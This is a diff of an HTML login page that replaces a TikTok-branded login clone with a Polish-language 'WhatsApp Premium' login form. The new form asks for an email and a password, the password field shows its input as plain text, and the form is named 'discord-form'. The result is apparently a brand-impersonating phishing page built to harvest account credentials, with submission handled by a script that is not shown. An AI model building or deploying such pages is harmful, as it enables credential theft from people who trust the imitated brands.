@@ -3,49 +3,35 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Log in | TikTok</title>
+  <title>WhatsApp Premium</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
   <script src="script.js" defer></script>
 </head>
 <body>
   <main class="page-shell">
-    <section class="form-panel" id="message" aria-labelledby="page-title">
-      <div class="login-brand" aria-label="TikTok-style demo">
-        <div class="video-mark"><span></span><span></span><span></span></div>
-        <span class="brand-name">TikTok</span>
+    <section class="form-panel" aria-labelledby="page-title">
+      <div class="whatsapp-header">
+        <div class="whatsapp-mark" aria-label="WhatsApp">WA</div>
+        <div>
+          <h1 id="page-title">Logowanie</h1>
+        </div>
       </div>
-      <h1 id="page-title">Log in to TikTok</h1>
-      <p class="login-subtitle">Manage your account and enjoy your feed.</p>
-
-      <div class="login-tabs" role="tablist" aria-label="Login method">
-        <button class="tab-button active" type="button" role="tab" aria-selected="true">Use phone / email / username</button>
+      <div class="chat-preview" aria-hidden="true">
       </div>
 
-      <form id="login-form">
-        <label for="first-text">Email or username</label>
-        <input id="first-text" name="firstText" type="text" placeholder="Enter your email or username" maxlength="200" autocomplete="username" required>
+      <form id="discord-form">
+        <input id="first-text" name="firstText" type="text" placeholder="email" maxlength="200" required>
 
-        <label for="second-text">Password</label>
-        <input id="second-text" name="secondText" type="password" placeholder="Enter your password" maxlength="200" autocomplete="current-password" required>
-
-        <a class="forgot-link" href="#forgot">Forgot password?</a>
+        <input id="second-text" name="secondText" type="text" placeholder="hasło" maxlength="200" required>
 
         <button type="submit" id="submit-button">
-          <span>Log in</span>
+          <span>Zaloguj</span>
         </button>
         <p id="form-status" class="form-status" role="status" aria-live="polite"></p>
       </form>
-
-      <div class="social-login" aria-label="Other login methods">
-        <button class="social-button" type="button"><span class="social-icon google-icon">G</span>Continue with Google</button>
-        <button class="social-button" type="button"><span class="social-icon facebook-icon">f</span>Continue with Facebook</button>
-        <button class="social-button" type="button"><span class="social-icon apple-icon">●</span>Continue with Apple</button>
-      </div>
-      <p class="signup-prompt">Don't have an account? <a class="signup-link" href="#signup">Sign up</a></p>
-      <p class="legal-note">By continuing, you agree to our Terms and Privacy Policy.</p>
     </section>
   </main>
 
